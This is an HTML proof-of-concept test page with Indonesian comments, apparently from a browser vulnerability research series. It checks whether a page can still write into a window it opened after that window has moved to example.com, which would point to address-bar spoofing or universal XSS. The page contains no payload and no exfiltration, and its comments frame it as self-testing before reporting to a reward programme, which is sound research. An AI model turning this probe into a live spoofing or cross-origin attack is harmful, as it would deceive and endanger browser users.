<!-- 28 - tulis ke anak SETELAH ia berpindah   [address-bar spoofing | macOS: Dia/Arc/Chrome macOS]
     MEKANISME : menguji apakah handle dokumen lama masih bisa menulis setelah anak berpindah origin - kalau bisa, ini bukan lagi sekadar spoofing (lihat 31-50).
     PREDIKAT  : tulisan penyerang muncul di bawah bilah milik origin lain.
     AMAN      : penulisan ditolak dengan SecurityError.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>28 tulis ke anak SETELAH ia berpindah</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
o.textContent='REAL: '+location.origin;
function go(){var w=window.open('https://example.com/','x');setTimeout(function(){try{w.document.write('<h3>ditulis oleh '+location.origin+'</h3>');o.textContent='TULIS BERHASIL - eskalasi ke kelas UXSS';}catch(e){o.textContent='ditolak (aman): '+e.name;}},1500);}
</script>
